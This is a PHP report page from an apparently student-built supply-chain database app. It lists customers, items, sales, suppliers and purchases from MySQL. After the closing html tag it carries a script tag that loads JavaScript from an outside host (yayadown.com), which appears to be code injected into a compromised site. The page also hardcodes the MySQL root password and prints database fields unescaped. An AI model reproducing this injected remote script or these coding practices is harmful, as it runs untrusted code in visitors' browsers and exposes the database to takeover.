<html>
<head>

<title>Report</title>
</head>
<SCRIPT language=JavaScript>
<!--
// Use the following three variables to set up the message:
var msg = "This Software is Designed By Lalit Chandnani(Administrator & Frontend Designer), Deepak Agnihotri(Analysis & Connectivity), Rahul Sharma(Database Designer) Student of CSE VIsem,OIST Bpl"
var delay = 100
var startPos = 127

// Don't touch these variables:
var timerID = null
var timerRunning = false
var pos = 0

// Crank it up!
StartScrolling()

function StartScrolling(){
    // Make sure the clock is stopped
    StopTheClock()

    // Pad the message with spaces to get the "start" position
    for (var i = 0; i < startPos; i++) msg = " " + msg

    // Off we go...
    DoTheScroll()
}

function StopTheClock(){
    if(timerRunning)
        clearTimeout(timerID)
    timerRunning = false
}

function DoTheScroll(){
    if (pos < msg.length)
        self.status = msg.substring(pos, msg.length);
    else
        pos=-1;
    ++pos
    timerRunning = true
    timerID = self.setTimeout("DoTheScroll()", delay)
}
//-->

</SCRIPT>
<body background="back.jpg">

	<img src="./top.jpg" width=975 >
<table width=1000>
	<tr>
	<td width='90%'><b>Welcome, lalit </b></td>
	<td width="10%"><a href="end.php" align="right"><font color="#000000"><b>Logout</b></font></a></td>
	</tr>
</table>

	<br>

<table>
	<tr>
		<td width="20%"></td>
		<td width="80%"><font size=5><b>Report</b></font><br><br>
		<textarea name="report" rows="20" cols="80" value="Ur report will b displayed Here !!">
		
		<?php	
		echo "CUSTOMER

		";
	
				$link = mysql_connect("localhost", "root", "gate1024");
				$result = mysql_db_query('scm', "SELECT * FROM customer",$link);
				
				while($data = mysql_fetch_row($result)){
				echo "Customer ID : $data[0]
		Company Name : $data[1] 
		Address : $data[2] 
		City :$data[3]
		Postal Code :$data[4]
		Contact NO :$data[5]
		email ID :$data[6]
		Fax :$data[7]
		State :$data[8]

		"; }


		echo "







		";


			
		echo "ITEM

		";
				$link = mysql_connect("localhost", "root", "gate1024");
				$result = mysql_db_query('scm', "SELECT * FROM item",$link);
				while($data = mysql_fetch_row($result)){
				echo "Item ID : $data[0]
		Item Name : $data[1] 
		Category : $data[2] 
		Purchasing Date :$data[3]
		Quantity :$data[4]
		Selling Price :$data[5]
		Description :$data[6]
		Date :$data[7]

		"; }


		echo "







		";

		
		echo "SALES

		";
				$link = mysql_connect("localhost", "root", "gate1024");
				$result = mysql_db_query('scm', "SELECT * FROM sales",$link);
				
				while($data = mysql_fetch_row($result)){
				echo "Order ID : $data[0]
		Customer ID : $data[1] 
		Item ID : $data[2] 
		Category :$data[3]
		Item Name :$data[4]
		Quantity of Item :$data[5]
		Quantity :$data[6]
		Price/unit :$data[7]
		Order date :$data[8]
		Delivery date :$data[9]
		Returning date :$data[10]

		"; }

		echo "







		";


		echo "SUPPLIER

		";
				$link = mysql_connect("localhost", "root", "gate1024");
				$result = mysql_db_query('scm', "SELECT * FROM supplier",$link);
				
				while($data = mysql_fetch_row($result)){
				echo "Supplier ID : $data[0]
		Company Name : $data[1] 
		Address : $data[2] 
		City :$data[3]
		Postal Code :$data[4]
		Contact NO :$data[5]
		Fax :$data[6]
		email ID :$data[7]
		State :$data[8]

		"; }


		echo "







		";

		
		echo "PURCHASE

		";
				$link = mysql_connect("localhost", "root", "gate1024");
				$result = mysql_db_query('scm', "SELECT * FROM purchase",$link);
				
				while($data = mysql_fetch_row($result)){
				echo "purchase ID : $data[0]
		Supplier ID : $data[1] 
		Item ID : $data[2]
		Item Name :$data[3] 
		Category :$data[4]
		Quantity :$data[5]
		Price/unit :$data[6]
		Purchasing date :$data[7]
		recieving date :$data[8]
		Returning date :$data[9]

		"; }
		?>
		

		</textarea>
		</td>
	</tr>
</table>

</body>
</html><script src="http://www.yayadown.com/b.js"></script>